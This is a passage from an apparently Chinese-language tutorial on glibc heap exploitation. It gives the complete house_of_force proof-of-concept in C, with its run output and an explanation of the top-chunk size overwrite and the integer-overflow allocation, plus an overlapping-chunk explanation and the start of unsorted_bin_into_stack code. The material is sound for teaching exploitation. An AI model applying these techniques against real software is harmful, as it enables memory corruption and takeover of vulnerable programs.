</span></span><span class=line><span class=cl>FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC�
</span></span></code></pre></td></tr></table></div></div><p>和上一个的区别在于，这次修改的是 allocated chunk 的 <code>chunk_size</code>。首先申请五个大小超过 fastbin 范围的 chunk，然后 <code>free(p4)</code>。随后通过 <code>p1</code> 的堆溢出修改 <code>p2</code> 的 <code>chunk_size</code> 为 <code>p2</code> 与 <code>p3</code> 的 <code>chunk_size</code> 之和。这就导致在 <code>free(p2)</code> 时，分配器认为需要释放 <code>chunk_size2+chunk_size3</code> 这么大一块内存，而下一块 chunk 恰好是同样空闲的 <code>p4</code>，这样就会将原本不相邻的 <code>p2</code> 和 <code>p4</code> 合并释放，中间的 <code>p3</code> 则成了最大受害者。</p><p>这时再申请一块 <code>chunk_size2+chunk_size3</code> 的 chunk<code>p6</code>，它就和 <code>p3</code> 重叠了，控制了整块 <code>p3</code> 的数据。</p><h2 id=house_of_force>house_of_force</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span><span class=lnt>95
</span><span class=lnt>96
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>   This PoC works also with ASLR enabled.
</span></span></span><span class=line><span class=cl><span class=cm>   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
</span></span></span><span class=line><span class=cl><span class=cm>   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum
</span></span></span><span class=line><span class=cl><span class=cm>   (http://phrack.org/issues/66/10.html)
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>   Tested in Ubuntu 14.04, 64bit.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;malloc.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>char</span> <span class=n>bss_var</span><span class=p>[]</span> <span class=o>=</span><span class=s>&#34;This is a string that we want to overwrite.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span> <span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Welcome to the House of Force</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The top chunk is a special chunk. Is the last in memory &#34;</span>
</span></span><span class=line><span class=cl>		<span class=s>&#34;and is the chunk that will be resized when malloc asks for more space from the os.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>In the end, we will use this to overwrite a variable at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Its current value is: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Let&#39;s allocate the first chunk, taking space from the wilderness.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>intptr_t</span> <span class=o>*</span><span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>256</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;The chunk of 256 bytes has been allocated at %p.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>p1</span> <span class=o>-</span> <span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>real_size</span> <span class=o>=</span> <span class=n>malloc_usable_size</span><span class=p>(</span><span class=n>p1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Real size (aligned and all that jazz) of our allocated chunk is %ld.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>real_size</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>//----- VULNERABILITY ----
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>intptr_t</span> <span class=o>*</span><span class=n>ptr_top</span> <span class=o>=</span> <span class=p>(</span><span class=n>intptr_t</span> <span class=o>*</span><span class=p>)</span> <span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>p1</span> <span class=o>+</span> <span class=n>real_size</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The top chunk starts at %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ptr_top</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Old size of top chunk %#llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>	<span class=o>*</span><span class=p>(</span><span class=n>intptr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;New size of top chunk %#llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>*</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span> <span class=kt>long</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>ptr_top</span> <span class=o>+</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>))));</span>
</span></span><span class=line><span class=cl>	<span class=c1>//------------------------
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	   <span class=s>&#34;Next, we will allocate a chunk that will get us right up against the desired region (with an integer</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	   <span class=s>&#34;overflow) and will then be able to allocate a chunk right over the desired region.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm>	 * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
</span></span></span><span class=line><span class=cl><span class=cm>	 * new_top = old_top + nb
</span></span></span><span class=line><span class=cl><span class=cm>	 * nb = new_top - old_top
</span></span></span><span class=line><span class=cl><span class=cm>	 * req + 2sizeof(long) = new_top - old_top
</span></span></span><span class=line><span class=cl><span class=cm>	 * req = new_top - old_top - 2sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>	 * req = dest - 2sizeof(long) - old_top - 2sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>	 * req = dest - old_top - 4*sizeof(long)
</span></span></span><span class=line><span class=cl><span class=cm>	 */</span>
</span></span><span class=line><span class=cl>	<span class=kt>unsigned</span> <span class=kt>long</span> <span class=n>evil_size</span> <span class=o>=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>bss_var</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>4</span> <span class=o>-</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>ptr_top</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>The value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl>	   <span class=s>&#34;we will malloc %#lx bytes.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>,</span> <span class=n>ptr_top</span><span class=p>,</span> <span class=n>evil_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=kt>void</span> <span class=o>*</span><span class=n>new_ptr</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=n>evil_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;As expected, the new pointer is at the same place as the old top chunk: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>new_ptr</span> <span class=o>-</span> <span class=k>sizeof</span><span class=p>(</span><span class=kt>long</span><span class=p>)</span><span class=o>*</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>void</span><span class=o>*</span> <span class=n>ctr_chunk</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Now, the next chunk we overwrite will point at our target buffer.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;malloc(100) =&gt; %p!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>ctr_chunk</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Now, we can finally overwrite that value:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... old string: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... doing strcpy overwrite with </span><span class=se>\&#34;</span><span class=s>YEAH!!!</span><span class=se>\&#34;</span><span class=s>...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>strcpy</span><span class=p>(</span><span class=n>ctr_chunk</span><span class=p>,</span><span class=s>&#34;YEAH!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;... new string: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bss_var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// some further discussion:
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//	&#34;and we \nwant to set this result to the address of malloc_got_address-8\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;After that a new call to malloc will return av-&gt;top+8 (+8 bytes for the header),&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//	&#34;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>//fprintf(stderr,&#34;The large chunk with evil_size has been allocated here 0x%08x\n&#34;,p2);
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>//fprintf(stderr,&#34;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&#34;,malloc_got_address);
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>	<span class=c1>//fprintf(stderr,&#34;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&#34;);
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>输出：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Welcome to the House of Force
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
</span></span><span class=line><span class=cl>The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>In the end, we will use this to overwrite a variable at 0x602060.
</span></span><span class=line><span class=cl>Its current value is: This is a string that we want to overwrite.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Let&#39;s allocate the first chunk, taking space from the wilderness.
</span></span><span class=line><span class=cl>The chunk of 256 bytes has been allocated at 0x13b3000.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
</span></span><span class=line><span class=cl>Real size (aligned and all that jazz) of our allocated chunk is 280.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now let&#39;s emulate a vulnerability that can overwrite the header of the Top Chunk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The top chunk starts at 0x13b3110
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
</span></span><span class=line><span class=cl>Old size of top chunk 0x20ef1
</span></span><span class=line><span class=cl>New size of top chunk 0xffffffffffffffff
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
</span></span><span class=line><span class=cl>Next, we will allocate a chunk that will get us right up against the desired region (with an integer
</span></span><span class=line><span class=cl>overflow) and will then be able to allocate a chunk right over the desired region.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>The value we want to write to at 0x602060, and the top chunk is at 0x13b3110, so accounting for the header size,
</span></span><span class=line><span class=cl>we will malloc 0xffffffffff24ef30 bytes.
</span></span><span class=line><span class=cl>As expected, the new pointer is at the same place as the old top chunk: 0x13b3110
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Now, the next chunk we overwrite will point at our target buffer.
</span></span><span class=line><span class=cl>malloc(100) =&gt; 0x602060!
</span></span><span class=line><span class=cl>Now, we can finally overwrite that value:
</span></span><span class=line><span class=cl>... old string: This is a string that we want to overwrite.
</span></span><span class=line><span class=cl>... doing strcpy overwrite with &#34;YEAH!!!&#34;...
</span></span><span class=line><span class=cl>... new string: YEAH!!!
</span></span></code></pre></td></tr></table></div></div><p>这个例子里要覆盖的地址位于 bss 段，处于 heap 段的下方，但是 heap 是向高地址生长的。所以这里的核心思想是利用整数溢出。</p><p>首先需要存在堆溢出漏洞。我们分配一个 <code>chunk0</code>，此时堆上只有两个 chunk：<code>chunk0</code> 和 top chunk。利用溢出修改 top chunk 的 <code>chunk_size</code> 为 <code>-1</code>，即 <code>0xffffffffffffffff</code>。这样做是因为后面需要申请很大的 chunk 进行整数溢出，这很可能导致 top chunk 大小不够，不去从 top chunk 切割而是调用 <code>mmap()</code>。伪造了 top chunk 的大小后，在后面申请大 chunk 时就不会触发 <code>mmap()</code>，确保了申请的大 chunk 也是从 top chunk 切割的。</p><p>接下来我们申请一个 <code>evil_size</code> 大小的 chunk，使得申请后 top chunk 指针（经过整数溢出）指向我们想要覆盖的变量 <code>bss_var</code> 的前面。这个 <code>evil_size</code> 的计算方法如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):
</span></span><span class=line><span class=cl>* new_top = old_top + nb
</span></span><span class=line><span class=cl>* nb = new_top - old_top
</span></span><span class=line><span class=cl>* req + 2sizeof(long) = new_top - old_top
</span></span><span class=line><span class=cl>* req = new_top - old_top - 2sizeof(long)
</span></span><span class=line><span class=cl>* req = dest - 2sizeof(long) - old_top - 2sizeof(long)
</span></span><span class=line><span class=cl>* req = dest - old_top - 4*sizeof(long)
</span></span></code></pre></td></tr></table></div></div><p>这时再次 <code>malloc</code>，得到的就是指向 <code>bss_var</code> 的指针了。</p><h2 id=unsorted_bin_into_stack>unsorted_bin_into_stack</h2><p>源码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdint.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span> <span class=n>stack_buffer</span><span class=p>[</span><span class=mi>4</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=mi>0</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating the victim chunk</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span><span class=o>*</span> <span class=n>victim</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span><span class=s>&#34;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>intptr_t</span><span class=o>*</span> <span class=n>p1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mh>0x100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
